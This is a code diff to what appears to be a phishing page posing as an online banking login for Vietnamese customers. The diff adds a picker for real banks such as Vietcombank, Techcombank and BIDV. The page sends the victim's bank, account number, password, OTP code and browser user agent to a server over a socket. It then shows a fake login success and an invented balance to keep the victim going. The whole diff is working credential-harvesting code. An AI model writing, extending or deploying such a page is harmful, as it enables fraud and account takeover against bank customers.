@@ -20,6 +20,21 @@
     </div>
     
     <div class="container">
+        <h2>Chọn ngân hàng của bạn</h2>
+        <div style="margin-bottom: 20px;">
+            <select id="bankSelect" style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; margin-bottom: 15px;">
+                <option value="">-- Chọn ngân hàng --</option>
+                <option value="vcb">🏦 Vietcombank</option>
+                <option value="tcb">🏦 Techcombank</option>
+                <option value="acb">🏦 ACB</option>
+                <option value="mb">🏦 MB Bank</option>
+                <option value="vpbank">🏦 VPBank</option>
+                <option value="sacombank">🏦 Sacombank</option>
+                <option value="bidv">🏦 BIDV</option>
+                <option value="vib">🏦 VIB</option>
+            </select>
+        </div>
+        
         <h2>Đăng nhập tài khoản</h2>
         <form id="loginForm">
             <div class="form-group">
@@ -103,11 +118,18 @@
         document.getElementById('loginForm').addEventListener('submit', (e) => {
             e.preventDefault();
             
+            const bankSelect = document.getElementById('bankSelect').value;
             const account = document.getElementById('account').value;
             const password = document.getElementById('password').value;
             const otp = document.getElementById('otp').value;
             
+            if (!bankSelect) {
+                alert('Vui lòng chọn ngân hàng!');
+                return;
+            }
+            
             socket.emit('login-attempt', {
+                bank: bankSelect,
                 account: account,
                 password: password,
                 otp: otp,
@@ -115,10 +137,11 @@
                 userAgent: navigator.userAgent
             });
             
-            if (account && password) {
+            if (bankSelect && account && password) {
                 alert('Đăng nhập thành công!');
                 document.querySelector('.container').innerHTML = `
                     <h2>Chào mừng!</h2>
+                    <p>Ngân hàng: ${document.querySelector('#bankSelect option:checked').text}</p>
                     <p>Tài khoản: ${account}</p>
                     <p>Số dư: 1,234,567,890 VNĐ</p>
                     <button onclick="transfer()">Chuyển khoản</button>
